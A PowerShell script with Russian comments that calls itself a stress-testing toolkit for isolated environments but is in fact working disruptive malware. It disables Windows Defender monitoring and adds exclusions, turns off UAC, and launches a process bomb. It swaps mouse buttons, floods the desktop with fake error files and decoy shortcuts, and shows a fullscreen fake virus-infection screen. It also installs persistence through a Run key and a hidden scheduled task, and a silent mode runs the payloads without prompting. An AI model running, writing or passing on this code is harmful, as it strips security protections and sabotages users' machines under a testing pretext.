# =================================================================
# [Project HARDENED] Системный инструмент для стресс-тестирования
# ТОЛЬКО для изолированных тестовых сред
# =================================================================

# Отключаем все предупреждения и ограничения
$ErrorActionPreference = 'SilentlyContinue'
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Конфигурация
$Global:Config = @{
    Version = "2.3"
    Mode = "AGGRESSIVE"
    SafetyLock = $false
    Persistence = $true
    LogFile = "$env:APPDATA\system_toolkit.log"
    MutexName = "Global\SysTool_Mutex_1337"
}

# Приватные функции
function Initialize-HardenedEnvironment {
    # Отключаем защиту реального времени
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -Force
        Set-MpPreference -DisableBehaviorMonitoring $true -Force
        Set-MpPreference -DisableBlockAtFirstSeen $true -Force
    } catch {}
    
    # Добавляем исключения в Defender
    Add-MpPreference -ExclusionPath "$env:TEMP" -Force
    Add-MpPreference -ExclusionPath "$env:APPDATA" -Force
    Add-MpPreference -ExclusionProcess "powershell.exe" -Force
    Add-MpPreference -ExclusionProcess "cmd.exe" -Force
}

function Invoke-SystemStress {
    param([int]$Duration = 60)
    
    Write-Host "[!] Запуск стресс-теста системы..." -ForegroundColor Red
    
    # Создаем нагрузку на CPU
    $cpuJob = Start-Job -ScriptBlock {
        while ($true) {
            $result = 1
            for ($i = 0; $i -lt 1000000; $i++) {
                $result *= 1.0000001
            }
        }
    }
    
    # Создаем нагрузку на память
    $memJob = Start-Job -ScriptBlock {
        $memArray = @()
        while ($true) {
            $memArray += New-Object byte[] 10MB
            Start-Sleep -Milliseconds 100
        }
    }
    
    # Создаем нагрузку на диск
    $diskJob = Start-Job -ScriptBlock {
        $counter = 0
        while ($true) {
            $filePath = "$env:TEMP\stress_test_$counter.dat"
            [System.IO.File]::WriteAllBytes($filePath, (New-Object byte[] (Get-Random -Minimum 1 -Maximum 10)MB))
            $counter++
            if ($counter -gt 100) {
                Get-ChildItem "$env:TEMP\stress_test_*.dat" | Select-Object -First 50 | Remove-Item -Force
                $counter = 0
            }
        }
    }
    
    # Запускаем множество процессов
    for ($i = 0; $i -lt 10; $i++) {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"while(`$true) { Start-Sleep 1 }`"" -WindowStyle Hidden
    }
    
    Write-Host "[+] Нагрузка создана. Длительность: $Duration сек" -ForegroundColor Yellow
    Start-Sleep -Seconds $Duration
    
    # Останавливаем нагрузку
    Stop-Job -Id $cpuJob.Id, $memJob.Id, $diskJob.Id -Force
    Remove-Job -Id $cpuJob.Id, $memJob.Id, $diskJob.Id -Force
    Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.Id -ne $PID} | Stop-Process -Force
}

function Set-DesktopEffects {
    # Меняем обои на черный экран
    $code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void SetWallpaper(string path) {
        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
    }
}
'@
    Add-Type -TypeDefinition $code
    
    # Создаем черное изображение
    $blackWallpaper = "$env:TEMP\black_wall.bmp"
    if (!(Test-Path $blackWallpaper)) {
        [byte[]]$bmpData = @(0x42,0x4D,0x36,0x00,0x0C,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x28,0x00,
                              0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x18,0x00,0x00,0x00,
                              0x00,0x00,0x00,0x00,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                              0x00,0x00,0x00,0x00,0x00,0x00)
        [System.IO.File]::WriteAllBytes($blackWallpaper, $bmpData)
    }
    
    [Wallpaper]::SetWallpaper($blackWallpaper)
    
    # Инвертируем цвета
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class HighContrast {
    [StructLayout(LayoutKind.Sequential)]
    public struct HIGHCONTRAST {
        public int cbSize;
        public int dwFlags;
        public IntPtr lpszDefaultScheme;
    }
    
    [DllImport("user32.dll")]
    public static extern bool SystemParametersInfo(int uiAction, int uiParam, ref HIGHCONTRAST pvParam, int fWinIni);
    
    public static void EnableHighContrast() {
        HIGHCONTRAST hc = new HIGHCONTRAST();
        hc.cbSize = Marshal.SizeOf(typeof(HIGHCONTRAST));
        hc.dwFlags = 0x00000001; // HCF_HIGHCONTRASTON
        hc.lpszDefaultScheme = IntPtr.Zero;
        SystemParametersInfo(0x0043, hc.cbSize, ref hc, 0x01 | 0x02);
    }
}
"@
    [HighContrast]::EnableHighContrast()
}

function Invoke-SystemModifications {
    # Изменяем реестр для странных эффектов
    $regPaths = @(
        "HKCU:\Control Panel\Desktop",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    )
    
    foreach ($path in $regPaths) {
        if (!(Test-Path $path)) {
            New-Item -Path $path -Force | Out-Null
        }
    }
    
    # Меняем курсор на часы
    Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name "Arrow" -Value "%SystemRoot%\Cursors\wait_r.cur" -Force
    Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name "Wait" -Value "%SystemRoot%\Cursors\wait_r.cur" -Force
    
    # Включаем залипание клавиш в агрессивном режиме
    Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility\StickyKeys" -Name "Flags" -Value "510" -Force
    
    # Меняем звуковую схему
    Set-ItemProperty -Path "HKCU:\AppEvents\Schemes" -Name "(Default)" -Value ".None" -Force
}

function Start-ProcessBomb {
    # Запускает множество процессов, которые создают еще процессы
    $scriptBlock = {
        while ($true) {
            Start-Process cmd.exe -ArgumentList "/c echo Process bomb active" -WindowStyle Hidden
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Start-Sleep 1`"" -WindowStyle Hidden
            if ((Get-Random -Maximum 100) -gt 70) {
                Start-Process notepad.exe -WindowStyle Hidden
            }
            Start-Sleep -Milliseconds 100
        }
    }
    
    for ($i = 0; $i -lt 3; $i++) {
        Start-Job -ScriptBlock $scriptBlock -Name "ProcessBomb_$i"
    }
}

function Set-UserAccountControl {
    # Отключаем UAC полностью
    $uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    if (!(Test-Path $uacKey)) {
        New-Item -Path $uacKey -Force | Out-Null
    }
    
    Set-ItemProperty -Path $uacKey -Name "EnableLUA" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $uacKey -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $uacKey -Name "PromptOnSecureDesktop" -Value 0 -Type DWord -Force
}

function Invoke-FileSystemChaos {
    # Создаем хаос в файловой системе
    $chaosDirs = @(
        "$env:USERPROFILE\Desktop\CHAOS",
        "$env:USERPROFILE\Documents\CHAOS_DATA",
        "$env:TEMP\SYSTEM_CHAOS"
    )
    
    $fileNames = @(
        "WARNING_SYSTEM_ERROR.txt",
        "CRITICAL_FAILURE.log",
        "VIRUS_DETECTED.exe",
        "SYSTEM_CORRUPTED.dll",
        "DO_NOT_OPEN.bat"
    )
    
    foreach ($dir in $chaosDirs) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        
        for ($i = 0; $i -lt 20; $i++) {
            $fileName = "{0}_{1:0000}.{2}" -f $fileNames[(Get-Random -Maximum $fileNames.Count)],
                                             (Get-Random -Maximum 9999),
                                             @("txt","log","tmp","dat")[(Get-Random -Maximum 4)]
            $filePath = Join-Path $dir $fileName
            
            # Создаем файл со случайным содержимым
            $content = @()
            for ($j = 0; $j -lt 100; $j++) {
                $content += "ERROR: " + (New-Guid).ToString().ToUpper()
                $content += "CODE: 0x" + (Get-Random -Maximum 99999999).ToString("X8")
                $content += "TIMESTAMP: " + (Get-Date).ToString("yyyy-MM-dd HH:mm:ss.fff")
                $content += ""
            }
            $content | Out-File -FilePath $filePath -Encoding ASCII
        }
    }
    
    # Создаем ярлыки на рабочем столе
    $shortcutNames = @(
        "SYSTEM_TOOLKIT.lnk",
        "CRITICAL_UPDATE.exe.lnk",
        "ANTIVIRUS_ALERT.lnk",
        "WINDOWS_REPAIR.lnk"
    )
    
    foreach ($name in $shortcutNames) {
        $ws = New-Object -ComObject WScript.Shell
        $shortcut = $ws.CreateShortcut("$env:USERPROFILE\Desktop\$name")
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"Write-Host 'System Modified' -ForegroundColor Red`""
        $shortcut.Save()
    }
}

function Enable-Persistence {
    # Добавляем автозапуск
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "SystemMaintenanceTool"
    $currentScript = $MyInvocation.MyCommand.Definition
    
    if ($currentScript) {
        Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$currentScript`"" -Force
        
        # Также добавляем в планировщик задач
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$currentScript`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Minutes 1)
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName "SystemMaintenance" `
                               -Action $action `
                               -Trigger $trigger `
                               -Principal $principal `
                               -Settings $settings `
                               -Force | Out-Null
    }
}

function Show-ScareScreen {
    # Показываем "пугающий" экран
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $form = New-Object Windows.Forms.Form
    $form.Text = "SYSTEM ALERT"
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.BackColor = 'Black'
    $form.TopMost = $true
    
    $label = New-Object Windows.Forms.Label
    $label.Text = "CRITICAL SYSTEM ERROR`n`nMEMORY CORRUPTION DETECTED`n`nVIRUS INFECTION CONFIRMED`n`nSYSTEM SHUTDOWN IN 60 SECONDS"
    $label.ForeColor = 'Red'
    $label.Font = New-Object Drawing.Font("Consolas", 24, [Drawing.FontStyle]::Bold)
    $label.TextAlign = 'MiddleCenter'
    $label.Dock = 'Fill'
    $label.AutoSize = $false
    
    $form.Controls.Add($label)
    
    # Запускаем в отдельном потоке
    $job = Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $form = New-Object Windows.Forms.Form
        $form.Text = "SYSTEM ALERT"
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.BackColor = 'Black'
        $form.TopMost = $true
        
        $label = New-Object Windows.Forms.Label
        $label.Text = "CRITICAL SYSTEM ERROR`n`nMEMORY CORRUPTION DETECTED`n`nVIRUS INFECTION CONFIRMED`n`nSYSTEM SHUTDOWN IN 60 SECONDS"
        $label.ForeColor = 'Red'
        $label.Font = New-Object Drawing.Font("Consolas", 24, [Drawing.FontStyle]::Bold)
        $label.TextAlign = 'MiddleCenter'
        $label.Dock = 'Fill'
        
        $form.Controls.Add($label)
        $form.ShowDialog()
    }
    
    Start-Sleep -Seconds 10
    Stop-Job $job -Force
    Remove-Job $job -Force
}

function Invoke-KeyboardMouseEffects {
    # Эффекты с клавиатурой и мышью
    Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class InputEffects {
    [DllImport("user32.dll")]
    public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
    
    [DllImport("user32.dll")]
    public static extern bool SwapMouseButton(bool fSwap);
    
    public static void InvertMouseButtons() {
        SwapMouseButton(true);
    }
    
    public static void MoveMouseRandomly() {
        Random rnd = new Random();
        mouse_event(0x0001, (uint)rnd.Next(0, 1000), (uint)rnd.Next(0, 1000), 0, 0);
    }
}
"@
    
    # Инвертируем кнопки мыши
    [InputEffects]::InvertMouseButtons()
    
    # Запускаем случайные движения мыши
    $mouseJob = Start-Job -ScriptBlock {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class MouseMover {
    [DllImport("user32.dll")]
    public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
}
"@
        while ($true) {
            [MouseMover]::mouse_event(0x0001, (Get-Random -Maximum 1000), (Get-Random -Maximum 1000), 0, 0)
            Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
        }
    }
}

function Show-MainMenu {
    Clear-Host
    Write-Host "==========================================" -ForegroundColor DarkRed
    Write-Host "     SYSTEM STRESS TOOLKIT v$($Global:Config.Version)" -ForegroundColor Red
    Write-Host "          [HARDENED MODE: $($Global:Config.Mode)]" -ForegroundColor Yellow
    Write-Host "==========================================" -ForegroundColor DarkRed
    Write-Host ""
    Write-Host "1. ЗАПУСТИТЬ ПОЛНЫЙ СТРЕСС-ТЕСТ" -ForegroundColor Cyan
    Write-Host "2. АКТИВИРОВАТЬ ВИЗУАЛЬНЫЕ ЭФФЕКТЫ" -ForegroundColor Cyan
    Write-Host "3. ЗАПУСТИТЬ ПРОЦЕСС-БОМБУ" -ForegroundColor Cyan
    Write-Host "4. СОЗДАТЬ ФАЙЛОВЫЙ ХАОС" -ForegroundColor Cyan
    Write-Host "5. ИЗМЕНИТЬ СИСТЕМНЫЕ НАСТРОЙКИ" -ForegroundColor Cyan
    Write-Host "6. АКТИВИРОВАТЬ ЭФФЕКТЫ ВВОДА" -ForegroundColor Cyan
    Write-Host "7. ПОКАЗАТЬ ЭКРАН ТРЕВОГИ" -ForegroundColor Cyan
    Write-Host "8. ВКЛЮЧИТЬ АВТОЗАПУСК" -ForegroundColor Yellow
    Write-Host "9. ВЫПОЛНИТЬ ВСЕ ОПЕРАЦИИ" -ForegroundColor Red
    Write-Host "0. ВЫХОД И ОТКАТ ИЗМЕНЕНИЙ" -ForegroundColor Green
    Write-Host ""
}

function Restore-System {
    # Пытается восстановить систему
    Write-Host "[!] Пытаюсь восстановить настройки..." -ForegroundColor Yellow
    
    # Восстанавливаем кнопки мыши
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class MouseRestore {
    [DllImport("user32.dll")]
    public static extern bool SwapMouseButton(bool fSwap);
}
"@
    [MouseRestore]::SwapMouseButton($false)
    
    # Удаляем автозапуск
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemMaintenanceTool" -ErrorAction SilentlyContinue
    
    # Удаляем задание из планировщика
    Unregister-ScheduledTask -TaskName "SystemMaintenance" -Confirm:$false -ErrorAction SilentlyContinue
    
    # Останавливаем все запущенные процессы
    Get-Job | Stop-Job -Force
    Get-Job | Remove-Job -Force
    
    Write-Host "[+] Система частично восстановлена" -ForegroundColor Green
    Write-Host "[!] Для полного восстановления может потребоваться перезагрузка" -ForegroundColor Yellow
}

# Главная функция
function Start-MainTool {
    # Проверка на администратора
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (!$isAdmin) {
        Write-Host "[!] Требуются права администратора!" -ForegroundColor Red
        Write-Host "[!] Запускаю с повышенными привилегиями..." -ForegroundColor Yellow
        
        $scriptPath = $MyInvocation.MyCommand.Definition
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $psi.Verb = "runas"
        
        try {
            [System.Diagnostics.Process]::Start($psi) | Out-Null
        } catch {
            Write-Host "[-] Отказано в доступе" -ForegroundColor Red
        }
        exit
    }
    
    Initialize-HardenedEnvironment
    
    do {
        Show-MainMenu
        $choice = Read-Host "`nВЫБЕРИТЕ ОПЦИЮ"
        
        switch ($choice) {
            "1" { 
                $duration = Read-Host "Длительность в секундах (по умолчанию 60)"
                if (!$duration) { $duration = 60 }
                Invoke-SystemStress -Duration $duration
            }
            "2" { Set-DesktopEffects }
            "3" { Start-ProcessBomb }
            "4" { Invoke-FileSystemChaos }
            "5" { 
                Invoke-SystemModifications
                Set-UserAccountControl
            }
            "6" { Invoke-KeyboardMouseEffects }
            "7" { Show-ScareScreen }
            "8" { Enable-Persistence }
            "9" {
                Write-Host "[!] ЗАПУСК ВСЕХ ОПЕРАЦИЙ..." -ForegroundColor Red
                Set-DesktopEffects
                Start-ProcessBomb
                Invoke-FileSystemChaos
                Invoke-SystemModifications
                Set-UserAccountControl
                Invoke-KeyboardMouseEffects
                Show-ScareScreen
                Enable-Persistence
                Invoke-SystemStress -Duration 30
                Write-Host "[+] ВСЕ ОПЕРАЦИИ ВЫПОЛНЕНЫ" -ForegroundColor Red
            }
            "0" { 
                Restore-System
                Write-Host "[+] Выход" -ForegroundColor Green
                return 
            }
            default { Write-Host "[-] Неверный выбор" -ForegroundColor Red }
        }
        
        if ($choice -ne "0") {
            Read-Host "`nНажмите Enter для продолжения"
        }
    } while ($true)
}

# Автозапуск при старте
if ($args -contains "-silent") {
    # Режим автоматического запуска всех функций
    Initialize-HardenedEnvironment
    Invoke-SystemStress -Duration 45
    Set-DesktopEffects
    Invoke-FileSystemChaos
    Start-ProcessBomb
    exit
}

# Точка входа
Start-MainTool
